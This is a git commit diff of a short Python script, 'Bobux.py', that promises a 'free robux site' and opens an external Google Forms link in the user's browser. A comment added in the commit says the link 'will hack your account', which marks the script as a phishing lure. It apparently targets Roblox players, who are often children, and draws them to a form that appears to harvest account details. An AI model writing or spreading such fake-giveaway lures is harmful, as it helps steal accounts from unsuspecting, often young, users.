aea1707d8bdb740b492ead0143fd975dbb69b9bd
HGGMCODING <ht900193@gmail.com>
2025-10-01 09:08:22 +0700

    Update Bobux.py

--- Bobux.py
+++ Bobux.py
@@ -4,8 +4,11 @@ print("\n 1) Redirect to free robux site")
 print("\n 2) Exit")
 option=int(input())
 if option==1:
+    #dont open this, this link will hack your account
     url = "https://docs.google.com/forms/d/e/1FAIpQLSdLLYPpbN5DDXy4icn1UrT2MnDeWbAtIplE9hAzFDDpRv6cFQ/viewform?usp=dialog"
     webbrowser.open(url)
 else:
     exit()
+
+#code by HGGM 
 
